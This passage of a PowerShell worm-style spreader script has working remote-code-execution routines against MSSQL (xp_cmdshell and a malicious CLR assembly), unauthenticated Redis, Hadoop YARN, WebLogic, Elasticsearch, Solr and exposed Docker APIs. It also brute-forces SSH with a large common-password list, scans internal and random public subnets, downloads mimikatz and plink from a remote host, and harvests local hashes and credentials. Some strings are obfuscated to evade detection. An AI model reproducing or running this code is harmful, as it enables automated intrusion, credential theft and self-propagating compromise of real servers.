        $ret = db_query -sqlconnection $sqlconnection -sqlcommand "SELECT service_account,@@version FROM sys.dm_server_services where servicename like 'SQL Server%' and servicename not like '%Agent%' and status_desc='Running'"

        $version=$ret[1].replace("`n","").replace("`r","")

        if($version -match "Microsoft SQL Server ([\d\.]+).+on Windows (.+)"){

            $banner = @($ret[0],$matches[1],$matches[2])-join"_"

        } else {

            $banner = @($ret[0],$version)-join"_"

        }

    }catch{

        write-host "select version error:"

        write-host $ERROR[0]

    }

    try{db_query -sqlconnection $sqlconnection -sqlcommand "exec sp_dropextendedproc 'xp_cmdshell';"}catch{

        write-host "sp_dropextendedproc error:"

        write-host $ERROR[0]

    }

    try{db_query -sqlconnection $sqlconnection -sqlcommand "dbcc addextendedproc('xp_cmdshell','xplog70.dll');"}catch{

        write-host "addextendedproc error:"

        write-host $ERROR[0]

    }

    try{db_query -sqlconnection $sqlconnection -sqlcommand "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE;"}catch{

        write-host "sp_configure error:"

        write-host $ERROR[0]

    }

    try{

        $sqlcmd = db_gencmd -rawcmd $cmd

        db_query -sqlconnection $sqlconnection -sqlcommand $sqlcmd

    }catch{

        write-host "xp_cmdshell error:"

        write-host $ERROR[0]

    }

    try{db_query -sqlconnection $sqlconnection -sqlcommand "sp_configure 'clr enabled',1;RECONFIGURE WITH OVERRIDE"}catch{

        write-host "sp_configure error:"

        write-host $ERROR[0]

    }

    try{db_query -sqlconnection $sqlconnection -sqlcommand "ALTER DATABASE master SET TRUSTWORTHY ON"}catch{

        write-host "ALTER DATABASE error:"

        write-host $ERROR[0]

    }

    try{db_query -sqlconnection $sqlconnection -sqlcommand "CREATE ASSEMBLY [evilclr] AUTHORIZATION [dbo] FROM }catch{

        write-host "CREATE ASSEMBLY error:"

        write-host $ERROR[0]

    }

    try{db_query -sqlconnection $sqlconnection -sqlcommand "CREATE PROCEDURE [dbo].[ExecCommand] @cmd NVARCHAR (MAX) AS EXTERNAL NAME [evilclr].[StoredProcedures].[ExecCommand]"}catch{

        write-host "CREATE PROCEDURE error:"

        write-host $ERROR[0]

    }

    try{

        $sqlcmd = db_gencmd -rawcmd $cmd1

        db_query -sqlconnection $sqlconnection -sqlcommand $sqlcmd

    }catch{

        write-host "exec dbo.execcommand error:"

        write-host $ERROR[0]

    }

    $SqlConnection.Close() 

    return $true,$banner

}

function sshbrute($ip,$user,$pass,$ssh_cmd){

    if(!(test-path $plinkexepath)){

        return 0

    }

    $global:flag = -1

    $process = New-Object System.Diagnostics.Process

    if($global:ssh_ip_cache -notcontains "$ip_$user"){

        $global:ssh_ip_cache+="$ip_$user"

        $process.StartInfo.FileName = "c:\windows\system32\cmd.exe"

        $process.StartInfo.Arguments = "/c echo y|$plinkexepath $user@$ip -pw $pass -v ""$ssh_cmd"""

    } else {

        $process.StartInfo.FileName = $plinkexepath

        $process.StartInfo.Arguments = "$user@$ip -pw $pass -v ""$ssh_cmd"""

    }

    $process.StartInfo.UseShellExecute = $false

    $process.StartInfo.CreateNoWindow = $true

    $process.StartInfo.RedirectStandardInput = $true

    $process.StartInfo.RedirectStandardOutput = $true

    $process.StartInfo.RedirectStandardError = $true

    $sScripBlock = {

        if (! [String]::IsNullOrEmpty($EventArgs.Data)) {

            $Event.MessageData.AppendLine($EventArgs.Data)

            if($EventArgs.Data.IndexOf("authentication failed") -ne -1){

                $global:flag = 0

            }

            if($EventArgs.Data.IndexOf("Access granted") -ne -1){

                $global:flag = 1

                $process.StandardInput.WriteLine("`n")

                $process.StandardInput.Close()

            }

        }

    }

    $oStdErrEvent = Register-ObjectEvent -InputObject $process -Action $sScripBlock -EventName 'ErrorDataReceived' -MessageData (New-Object -TypeName System.Text.StringBuilder)

    $oStdOutputEvent = Register-ObjectEvent -InputObject $process -Action $sScripBlock -EventName 'OutputDataReceived' -MessageData (New-Object -TypeName System.Text.StringBuilder)

    $process.Start()|out-null

    $process.BeginErrorReadLine()

    $process.BeginOutputReadLine()

    $count=50

    while($true){

        if($process.HasExited){

            Unregister-Event -SourceIdentifier $oStdOutputEvent.Name

            Unregister-Event -SourceIdentifier $oStdErrEvent.Name

            return 0

        }

        if($count -eq 0){

            $process.Kill()

            Unregister-Event -SourceIdentifier $oStdOutputEvent.Name

            Unregister-Event -SourceIdentifier $oStdErrEvent.Name

            return 0

        }

        Start-Sleep -milliseconds 100

        $count--

        if($global:flag -ne -1) {

            Unregister-Event -SourceIdentifier $oStdOutputEvent.Name

            Unregister-Event -SourceIdentifier $oStdErrEvent.Name

            return $global:flag

        }

    }

}

function isPubIP {

    Param(

    [parameter(Mandatory=$true)][String]$ip

    )

    $resIps = @(

        @(4026531840L, 3758096384L),

        @(4026531840L, 4026531840L),

        @(4278190080L, 0L),

        @(4278190080L, 167772160L),

        @(4278190080L, 2130706432L),

        @(4290772992L, 1681915904L),

        @(4293918720L, 2886729728L),

        @(4294836224L, 3323068416L),

        @(4294901760L, 2851995648L),

        @(4294901760L, 3232235520L),

        @(4294967040L, 3221225472L),

        @(4294967040L, 3221225984L),

        @(4294967040L, 3227017984L),

        @(4294967040L, 3325256704L),

        @(4294967040L, 3405803776L),

        @(4294967295L, 4294967295L)

    )

    $iparr = $ip.split(".")

    $iplong = 0

    for($i=3;$i -ge 0; $i--){

        $iplong = $iplong -bor [int]$iparr[3-$i] * [math]::pow(2,8*$i)

    }

    for($j=0;$j -lt $resIps.count;$j++){

        if(($iplong -band $resIps[$j][0]) -eq $resIps[$j][1]){

            return $false

        }

    }

    return $true

}

function getipaddrs($flag){

    write-host "Get ipaddress..."

    $global:ipaddrs_i = @()

    $global:ipaddrs_o = @()

    $allip = @()

    [string[]]$ipsub = @('192.168.0','192.168.1','192.168.2','192.168.3','192.168.4','192.168.5','192.168.6','192.168.7','192.168.8','192.168.9','192.168.10','192.168.18','192.168.31','192.168.199','192.168.254','192.168.67','10.0.0','10.0.1','10.0.2','10.1.1','10.90.90','10.1.10','10.10.1','172.16.1','172.16.2','172.16.3')

    [string[]]$ipsub_o = @()

    if(!$flag){

        $regex = [regex]"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"

        $regex.Matches((ipconfig /all)) | ForEach-Object { 

            if ($allip -notcontains $_.Value)

            { $allip += $_.Value }

        }

        $regex.Matches((ipconfig /displaydns)) | ForEach-Object { 

            if ($allip -notcontains $_.Value)

            { $allip += $_.Value }

        }

        $regex.Matches((netstat -ano)) | ForEach-Object { 

            if ($allip -notcontains $_.Value)

            { $allip += $_.Value }

        }

        try{

            $NetObject = New-Object Net.WebClient

            $wlanip = $NetObject.DownloadString("https://api.ipify.org/")   

            $allip += $wlanip           

        }catch{}

        try{

            $addressList = [System.Net.DNS]::GetHostByName($null).AddressList     

            $localip = @()

            Foreach ($ip in $addressList)

            {

                $localip += $ip.IPAddressToString

                $allip += $localip

            }

        }catch{}

        foreach($IP in $allip)

        {

            if($IP.startswith('127.') -or $IP.startswith('169.254.') -or $IP.startswith('0.0.0.0') -or $IP.startswith('255.255.255.')){

                continue

            }

            $iptemp = $ip.Split(".")

            $SubnetIP = $iptemp[0] + "." +  $iptemp[1] + "." +  $iptemp[2]

            if ($ipsub -notcontains $SubnetIP){ 

                if(isPubIP $IP){

                    $ipsub_o = @($SubnetIP) + $ipsub_o

                } else {

                    $ipsub = @($SubnetIP) + $ipsub

                }

            }

        }

        write-host "inter ipsub count:"($ipsub.count)

        #$ipsub

        foreach($ipsub2 in $ipsub)

        {   

            $global:ipaddrs_i += 0..255|%{$ipsub2+"."+$_}

        }

        $global:ipaddrs_i = @($global:ipaddrs_i | Where-Object { $localip -notcontains $_ })

    }

    while($true){

        $ran_ipsub_b = ""+(0+(Get-Random -Maximum 255))+"."+(0+(Get-Random -Maximum 255))

        if(isPubIP ($ran_ipsub_b+".1.1")){break}

    }

    $global:ipaddrs_b = $ran_ipsub_b

    for($i=0; $i -lt 256; $i++){

        try{

            $ran_ipsub = $ran_ipsub_b+"."+$i

            if($ipsub_o -notcontains $ran_ipsub){

                $ipsub_o += $ran_ipsub

            }

        }catch{}

    }

    write-host "outer ipsub count:"($ipsub_o.count)

    #$ipsub_o

    foreach($ipsub3 in $ipsub_o)

    {   

        $global:ipaddrs_o += 0..255|%{$ipsub3+"."+$_}

    }

    write-host "Get address done!!"

}

function localscan { 

    Param(

    [int]$Port = 445,

    [string[]]$addresses

    )

    [string[]]$openips = @()

    if($addresses.count -gt 0){

        write-host ("scan port $port...from "+$addresses[0]+" to "+$addresses[$addresses.count-1])

        $clients = @{}

        $connects = @{}

        foreach($ip in $addresses) {

            try{

                $client = New-Object System.Net.Sockets.TcpClient

                $connect = $client.BeginConnect($ip,$port,$null,$null)

                $connects[$ip] = $connect

                $clients[$ip] = $client

            }

            catch{

                Write-host $Error[0]

            }

        }

        Start-Sleep 3

        foreach($ip1 in $clients.Keys) {

            if ($clients[$ip1].Connected) {

                $clients[$ip1].EndConnect($connects[$ip1])

                $openips += $ip1

            }

            $clients[$ip1].Close()

        }

        "total scan ip port open count:"+$openips.count

        write-host $openips

    }

    return ,$openips

}

function redisexec($ip,$port,$cmd){

    function sendandread($sock,$str){

        [Byte[]] $pkt = [Text.Encoding]::ASCII.getbytes($str)

        $sock.Send($pkt)|out-null

        $nb = [Array]::CreateInstance(('byt'+'e'), 20000)

        $recv = $sock.Receive($nb)

        $str1=[Text.Encoding]::ASCII.getstring($nb[0..($recv-1)])

        return $str1

    }

    try{

        $client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($ip,$port)

    }catch{

        return 0

    }

    $sock = $client.Client

    $sock.ReceiveTimeout =5000

    $ret = sendandread $sock "info`n"

    if($ret.indexof("os:Linux") -gt 0){

        $ret_f = 2

        write-host "Found no pass and linux"

        $ret = sendandread $sock "config set dir /var/spool/cron`n"

        if($ret.indexof("Permission denied") -gt 0){

            $ret_f = 1

        }

        $ret = sendandread $sock "config set dbfilename root`n"

        $ret = sendandread $sock "set x2x ""\n\n\n*/1 * * * * $cmd\n\n\n""`n"

        $ret = sendandread $sock "save`n"

        start-sleep 3

        $ret = sendandread $sock "config set dir /var/spool/cron/crontabs`n"

        $ret = sendandread $sock "save`n"

        write-host "Done"

        $sock.Close()

        return $ret_f

    }

    $sock.Close()

    return 0

}

function yarnexec($ip,$cmd){

    function urlpost($ip,$path,$data){

        try{

            $client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($ip,8088)

        }catch{

            return ""

        }

        $sock = $client.Client

        $sock.ReceiveTimeout =5000

        $data_length = $data.length

        $sock_send_str = "POST $path HTTP/1.1`nHost: ${ip}:8088`nUser-Agent: curl/7.55.1`nAccept: */*`n"

        if($data -ne ""){

            $sock_send_str += "Content-Type: application/json`nContent-Length:$data_length`n`n$data"

        }else {

            $sock_send_str += "`n"

        }

        [Byte[]] $pkt = [Text.Encoding]::ASCII.getbytes($sock_send_str)

        $sock.Send($pkt)|out-null

        $nb = [Array]::CreateInstance(('byt'+'e'), 20000)

        $recv = $sock.Receive($nb)

        $str=[Text.Encoding]::ASCII.getstring($nb[0..($recv-1)])

        $sock.Close()

        return $str

    }

    $ret = urlpost $ip "/ws/v1/cluster/apps/new-application" ""

    if($ret.indexOf('"application-id"') -ne -1){

        $keyid=($ret -split '"')[3]

        $keyname=-join([char[]](48..57+65..90+97..122)|Get-Random -Count (6+(Get-Random)%6))

        $cmd = $cmd.replace('"','\"')

        $postdata="{""application-id"":""$keyid"",""application-name"":""$keyname"",""application-type"":""YARN"",""am-container-spec"":{""commands"":{""command"":""$cmd""}}}"

        $ret1 = urlpost $ip "/ws/v1/cluster/apps" $postdata

        return $true

    }

    return $false

}

function logicexec($ip,$cmd){

    try{

        $client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($ip,7001)

    }catch{

        return $false

    }

    $sock = $client.Client

    $sock.ReceiveTimeout =5000

    $send_pkt = [Text.Encoding]::ASCII.getbytes("t3 12.2.1`nAS:255`nHL:19`n`n")

    $sock.Send($send_pkt)|out-null

    $nb = [Array]::CreateInstance(('byt'+'e'), 20000)

    $recv = $sock.Receive($nb)

    $str=[Text.Encoding]::ASCII.getstring($nb[0..($recv-1)])

    $sock.Close()|out-null

    if($str -match "HELO:(10\.3\.6\.0|12\.1\.3\.0|12\.2\.1\.3|12\.2\.1\.4|14\.1\.1\.0)"){

        $logicver = $matches[1]

        $client1 = NE`W-`obj`EcT System.Net.Sockets.TcpClient($ip,7001)

        $sock1 = $client1.Client

        $sock1.ReceiveTimeout =5000

        if($cmd -match "powershell"){

            $exec_obj = "new String[]{%27cmd%27,%27/c%27,%27$cmd%27}"

        } else{

            $exec_obj = "new String[]{%27/bin/sh%27,%27-c%27,%27$cmd%27}"

        }

        $send_str = "GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec($exec_obj);%22); HTTP/1.1`nHost: ${ip}:7001`nUser-Agent: curl/7.55.1`nAccept: */*`nContent-Type:application/x-www-form-urlencoded; charset=utf-8`n`n"

        $send_pkt1 = [Text.Encoding]::ASCII.getbytes($send_str)

        $sock1.Send($send_pkt1)|out-null

        return $logicver

    }

    return $false

}

function esexec($ip,$cmd){

    function urlrequest($ip,$path,$data){

        try{

            $client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($ip,9200)

        }catch{

            return ""

        }

        $sock = $client.Client

        $sock.ReceiveTimeout =5000

        if($data -ne ""){

            $data_length = $data.length

            $sock_send_str += "POST $path HTTP/1.1`nHost: ${ip}:9200`nUser-Agent: curl/7.55.1`nAccept: */*`nContent-Type: application/x-www-form-urlencoded`nContent-Length:$data_length`n`n$data"

        }else {

            $sock_send_str += "GET $path HTTP/1.1`nHost: ${ip}:9200`nUser-Agent: curl/7.55.1`nAccept: */*`n`n"

        }

        [Byte[]] $pkt = [Text.Encoding]::ASCII.getbytes($sock_send_str)

        $sock.Send($pkt)|out-null

        $nb = [Array]::CreateInstance(('byt'+'e'), 20000)

        $recv = $sock.Receive($nb)

        $str=[Text.Encoding]::ASCII.getstring($nb[0..($recv-1)])

        $sock.Close()

        return $str

    }

    $ret = urlrequest $ip "/" ""

    if($ret -match 'number" : "([\d\.]+)"' -and $matches[1] -le "1.4.2"){

        write-host "version:",($matches[1]),",seems vul"

        if($cmd -match "powershell"){

            $postdata = '{"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec([\"cmd\",\"/c\",'''+$cmd+'''] as String[]).getInputStream())).readLines()","lang": "groovy"}}}'

        } else{

            $postdata = '{"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec([\"/bin/sh\",\"-c\",'''+$cmd+'''] as String[]).getInputStream())).readLines()","lang": "groovy"}}}'

        }

        urlrequest $ip "/blogs/users" '{"name":"tom"}'

        sleep 1

        $ret1 = urlrequest $ip "/_search?pretty" "$postdata"

        return $true

    }

    return $false

}

function solrexec($ip,$cmd){

    function urlrequest($ip,$path,$data){

        try{

            $client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($ip,8983)

        }catch{

            return ""

        }

        $sock = $client.Client

        if($data -ne ""){

            $data_length = $data.length

            $sock_send_str += "POST $path HTTP/1.1`nHost: ${ip}:8983`nUser-Agent: curl/7.55.1`nAccept: */*`nContent-Type: application/x-www-form-urlencoded`nX-Requested-With:XMLHttpRequest`nReferer:http://${ip}:8983/solr/`nContent-Length:$data_length`n`n$data"

        }else {

            $sock_send_str += "GET $path HTTP/1.1`nHost: ${ip}:8983`nUser-Agent: curl/7.55.1`nAccept: */*`n`n"

        }

        [Byte[]] $pkt = [Text.Encoding]::ASCII.getbytes($sock_send_str)

        $sock.Send($pkt)|out-null

        $nb = [Array]::CreateInstance(('byt'+'e'), 200000)

        $recv = $sock.Receive($nb)

        $str=[Text.Encoding]::ASCII.getstring($nb[0..($recv-1)])

        $sock.Close()

        return $str

    }

    $ret = urlrequest $ip "/solr/admin/cores" ""

    $mc = [regex]::matches($ret, 'name":"(.+)"')

    for($i=0;$i -lt $mc.count;$i++){

        $core_name = $mc[$i].value.split('"')[2]

        $ret = urlrequest $ip "/solr/$core_name/admin/mbeans?cat=QUERY&wt=json" ""

        if($ret.indexOf("DataImportHandler") -ne -1){

            if($cmd -match "powershell"){

                $cmdlist = "[""cmd.exe"",""/c"", ""$cmd""]"

            } else {

                $cmdlist = "[""/bin/sh"",""-c"", ""$cmd""]"

            }

            $dataconfig = @"

<dataConfig>

  <dataSource type="URLDataSource"/>

  <script><![CDATA[

          function f1(data){new java.lang.ProcessBuilder["(java.lang.String[])"]($cmdlist).start()}

  ]]></script>

  <document>

    <entity name="stackoverflow"

        url="$core_url/deps/solr.xml" processor="XPathEntityProcessor" forEach="/feed|/feed/entry" transformer="script:f1"> 

    </entity>

  </document>

</dataConfig>

"@

            $postdata = "command=full-import&verbose=false&clean=false&commit=false&debug=true&core=$core_name&name=dataimport&dataConfig="+$dataconfig.replace("`r","").replace("`n","").replace(" ","+")

            $ret = urlrequest $ip "/solr/$core_name/dataimport?_=1565530241159&indent=on&wt=json" $postdata

            return $core_name

        }

    }

    return $false

}

function dockerexec($ip,$cmd){

    function urlrequest($ip,$path,$data){

        try{

            $client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($ip,2375)

        }catch{

            return ""

        }

        $sock = $client.Client

        if($data -eq ""){

            $sock_send_str += "GET $path HTTP/1.1`nHost: ${ip}:2375`nUser-Agent: curl/7.55.1`nAccept: */*`n`n"

        }else {

            if($data -eq "DELETE"){

                $sock_send_str += "DELETE $path HTTP/1.1`nHost: ${ip}:2375`nUser-Agent: curl/7.55.1`nAccept: */*`n`n"

            }else{

                $data_length = $data.length

                $sock_send_str += "POST $path HTTP/1.1`nHost: ${ip}:2375`nUser-Agent: curl/7.55.1`nAccept: */*`nContent-Type: application/json`nContent-Length:$data_length`n`n$data"

            }

        }

        [Byte[]] $pkt = [Text.Encoding]::ASCII.getbytes($sock_send_str)

        $sock.Send($pkt)|out-null

        $nb = [Array]::CreateInstance(('byt'+'e'), 200000)

        $recv = $sock.Receive($nb)

        $str=[Text.Encoding]::ASCII.getstring($nb[0..($recv-1)])

        $sock.Close()

        return $str

    }

    $ret = urlrequest $ip "/_ping" ""

    if($ret -match "Api-Version: ([\d\.]+)"){

        $docker_version = $matches[1]

        $ret = urlrequest $ip "/v$docker_version/images/json" ""

        [Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")|out-null

        try{

            $obj = (New-Object Web.Script.Serialization.JavaScriptSerializer).DeserializeObject($ret.split("`n")[-2])

        }catch{

            $obj = (New-Object Web.Script.Serialization.JavaScriptSerializer).DeserializeObject($ret.split("`n")[-1])

        }

        $imageid = ($obj[0].Id).split(":")[-1].substring(0,12)

        $tag = $obj[0].RepoTags[0]

        $postdata = @"

        {"Hostname":"","Domainname":"","User":"root","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":null,"Cmd":["/bin/sh","-c","echo '* * * * * $cmd' \u003e\u003e /mnt/root;echo 123"],"Image":"$imageid","Volumes":{},"WorkingDir":"","Entrypoint":null,"OnBuild":null,"Labels":{},"HostConfig":{"Binds":["/var/spool/cron/:/mnt"],"ContainerIDFile":"","LogConfig":{"Type":"","Config":{}},"NetworkMode":"default","PortBindings":{},"RestartPolicy":{"Name":"no","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":null,"CapAdd":null,"CapDrop":null,"CgroupnsMode":"","Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":true,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":0,"ConsoleSize":[0,0],"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":[],"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":[],"DeviceCgroupRules":null,"DeviceRequests":null,"KernelMemory":0,"KernelMemoryTCP":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":-1,"OomKillDisable":false,"PidsLimit":0,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":null,"ReadonlyPaths":null},"NetworkingConfig":{"EndpointsConfig":{}},"Platform":null}

"@.trim()

        $ret = urlrequest $ip "/v$docker_version/containers/create" $postdata

        $containerid = $ret.split('"')[3].substring(0,12)

        $ret = urlrequest $ip "/v$docker_version/containers/$containerid/start" " "

        sleep 3

        $ret = urlrequest $ip "/v$docker_version/containers/$containerid" "DELETE"

        return "$docker_version $tag $imageid"

    }

    return $false

}

function Gen-NTLM($str){

    Add-Type -TypeDefinition @'

    using System;

    using System.Text;

    using System.Runtime.InteropServices;

    public class BCrypt

    {

        [DllImport("bcrypt.dll", CharSet = CharSet.Auto)]

        public static extern NTStatus BCryptOpenAlgorithmProvider(

            [Out] out IntPtr phAlgorithm,

            [In] string pszAlgId,

            [In, Optional] string pszImplementation,

            [In] UInt32 dwFlags);

        [DllImport("bcrypt.dll")]

        public static extern NTStatus BCryptCloseAlgorithmProvider(

            [In, Out] IntPtr hAlgorithm,

            [In] UInt32 dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Auto)]

        public static extern NTStatus BCryptCreateHash(

            [In, Out] IntPtr hAlgorithm,

            [Out] out IntPtr phHash,

            [Out] IntPtr pbHashObject,

            [In, Optional] UInt32 cbHashObject,

            [In, Optional] IntPtr pbSecret,

            [In] UInt32 cbSecret,

            [In] UInt32 dwFlags);

        [DllImport("bcrypt.dll")]

        public static extern NTStatus BCryptDestroyHash(

            [In, Out] IntPtr hHash);

        [DllImport("bcrypt.dll")]

        public static extern NTStatus BCryptHashData(

            [In, Out] IntPtr hHash,

            [In, MarshalAs(UnmanagedType.LPArray)] byte[] pbInput,

            [In] int cbInput,

            [In] UInt32 dwFlags);

        [DllImport("bcrypt.dll")]

        public static extern NTStatus BCryptFinishHash(

            [In, Out] IntPtr hHash,

            [Out, MarshalAs(UnmanagedType.LPArray)] byte[] pbInput,

            [In] int cbInput,

            [In] UInt32 dwFlags);

        [Flags]

        public enum AlgOpsFlags : uint

        {            

            BCRYPT_PROV_DISPATCH = 0x00000001,

            BCRYPT_ALG_HANDLE_HMAC_FLAG = 0x00000008,

            BCRYPT_HASH_REUSABLE_FLAG = 0x00000020

        }

        public enum NTStatus : uint

        {

            STATUS_SUCCESS = 0x00000000

        }

    }

'@

    $DataToHash = $([Text.Encoding]::Unicode.GetBytes($str))

    [Byte[]]$HashBytes   = New-Object Byte[] 16

    [IntPtr]$PHAlgorithm = [IntPtr]::Zero

    [IntPtr]$PHHash      = [IntPtr]::Zero

    $NTStatus = [BCrypt]::BCryptOpenAlgorithmProvider([Ref] $PHAlgorithm, 'MD4', $Null, 0)

    If ($NTStatus -NE 0)

    {

        Write-Error "BCryptOpenAlgorithmProvider failed with NTSTATUS $NTStatus"

        If ($PHAlgorithm -NE [IntPtr]::Zero)

        {

            $NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0)

        }

        Return

    }

    $NTStatus = [BCrypt]::BCryptCreateHash($PHAlgorithm, [Ref] $PHHash, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, 0)

    If ($NTStatus -NE 0)

    {

        Write-Error "BCryptCreateHash failed with NTSTATUS $NTStatus"

        If ($PHHash -NE [IntPtr]::Zero)

        {

            $NTStatus = [BCrypt]::BCryptDestroyHash($PHHash)                

        }

        If ($PHAlgorithm -NE [IntPtr]::Zero)

        {

            $NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0)

        }

        Return

    }

    $NTStatus = [BCrypt]::BCryptHashData($PHHash, $DataToHash, $DataToHash.Length, 0)

    $NTStatus = [BCrypt]::BCryptFinishHash($PHHash, $HashBytes, $HashBytes.Length, 0)

    If ($PHHash -NE [IntPtr]::Zero)

    {

        $NTStatus = [BCrypt]::BCryptDestroyHash($PHHash)

    }

    If ($PHAlgorithm -NE [IntPtr]::Zero)

    {

        $NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0)

    }

    $HashString = New-Object System.Text.StringBuilder

    Foreach ($Byte In $HashBytes)

    {

        [Void]$HashString.Append($Byte.ToString("X2"))

    }

    Return $HashString.ToString()

}

[string[]]$global:alluser = @("administrator","admin")

[string[]]$global:WmicUSER = @("administrator")  

[string[]]$global:allpass = @("helloworld","saadmin","123456","test1","zinch","g_czechout","asdf","Aa123456.","dubsmash","password","PASSWORD","123.com","admin@123","Aa123456","qwer12345","Huawei@123","123@abc","golden","123!@#qwe","1qaz@WSX","Ab123","1qaz!QAZ","Admin123","Administrator","Abc123","Admin@123","999999","Passw0rd","123qwe!@#","football","welcome","1","12","21","123","321","1234","12345","123123","123321","111111","654321","666666","121212","000000","222222","888888","1111","555555","1234567","12345678","123456789","987654321","admin","abc123","abcd1234","abcd@1234","abc@123","p@ssword","P@ssword","p@ssw0rd","P@ssw0rd","P@SSWORD","P@SSW0RD","P@w0rd","P@word","iloveyou","monkey","login","passw0rd","master","hello","qazwsx","password1","Password1","qwerty","baseball","qwertyuiop","superman","1qaz2wsx","fuckyou","123qwe","zxcvbn","pass","aaaaaa","love","administrator","qwe1234A","qwe1234a"," ","123123123","1234567890","88888888","111111111","112233","a123456","123456a","5201314","1q2w3e4r","qwe123","a123456789","123456789a","dragon","sunshine","princess","!@#$%^&*","charlie","aa123456","homelesspa","1q2w3e4r5t","sa","sasa","sa123","sql2005","sa2008","abc","abcdefg","sapassword","Aa12345678","ABCabc123","sqlpassword","sql2008","11223344","admin888","qwe1234","A123456","OPERADOR","Password123","test123","NULL","user","test","Password01","stagiaire","demo","scan","P@ssw0rd123","xerox","compta")

$global:allhash = @()

$global:temphashes = @()

$byte_bat = [Convert]::FromBase64String($batb64)

[string[]]$global:ipaddrs_i = @()

[string[]]$global:ipaddrs_o = @()

$global:ipaddrs_b=""

$global:retry = 0

$global:getusers = @()

$global:getpasswd = @()

$global:getdomain = @()

$global:gethashs = @()

try{$localIf=$flase;New-Object Threading.Mutex($true,'Global\eLocalIf',[ref]$localIf)}catch{}

try{$VVERSION=$ifmd5[0..5]-join""}catch{}

$mimipath = $env:tmp+'\mimi.dat'

$d_retry=3 

while(!(Test-Path $mimipath) -or (Get-Item $mimipath).length -ne 3563487){

    if($d_retry -eq 0){break}

    write-host "try to get mimi...$d_retry"

    try{(new-object System.Net.WebClient).DownloadFile($down_url+"/mimi.dat?v=$VVERSION&r=$d_retry",$mimipath)}catch{}

    $d_retry--

    start-sleep 1

}

$plinkexepath = $env:tmp+"\knil.exe"

$d_retry=3

while(!(Test-Path $plinkexepath) -or (Get-Item $plinkexepath).length -ne 601100){

    write-host "try to get plink...$d_retry"

    if($d_retry -eq 0){break}

    try{

        $con=(new-object System.Net.WebClient).DownloadData($down_url+"/knil.bin?v=$VVERSION&r=$d_retry")

        [System.IO.File]::WriteAllBytes($plinkexepath,(New-Object IO.BinaryReader(New-Object System.IO.Compression.GzipStream (New-Object System.IO.MemoryStream(,$con[100..($con.count)])), ([IO.Compression.CompressionMode]::Decompress))).ReadBytes(10000000)+((1..127)|Get-Random -Count 100))

    }catch{}

    $d_retry--

    start-sleep 1

}

try{  

    write-host "init...."

    $temp = (Get-WmiObject -Class Win32_UserAccount)

    foreach ($t in $temp) {

        $pattern="(\d{4}$)"

        if(($t.SID -match $pattern) -and ($alluser -notcontains $t.Name)){   

            $alluser += $t.Name

        }

    }

    if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){

        $hasharray = geth  

        foreach($hashline in $hasharray){

            $hash = $hashline.split(":")

            $un = $hash[0]

            $hs = $hash[3]

            if($hash[1] -eq '500' -or $hash[1].length -eq 4){

                if ($alluser -notcontains $un){

                $alluser += "$un"

                }

                if ($temphashes -notcontains $hs){

                $temphashes += "$hs"

                }

            }

        }

        $getpass = (Invoke-Mypass).Replace(" ", "")  

        write-host $getpass

        $mm=[regex]::matches($getpass,'\*Username:.+');  

        $pp=[regex]::matches($getpass,'\*Password:.+');

        $nn=[regex]::matches($getpass,'\*NTLM:.+');

        $dd=[regex]::matches($getpass,'\*Domain:.+');

        foreach($uuu in $mm){

            $uuu=$uuu.value.trim().Replace('*Username:', "");

            if (($uuu -ne "(null)") -and ($uuu.IndexOf("`$") -eq -1) -and ($getusers -notcontains $uuu)){

            $getusers += "$uuu"

            }

            if (($uuu -ne "(null)") -and ($uuu.IndexOf("`$") -eq -1) -and ($alluser -notcontains $uuu)){

            $alluser += "$uuu"

            }

        }

        foreach($ppp in $pp){

            $ppp=$ppp.value.trim().Replace('*Password:', "");

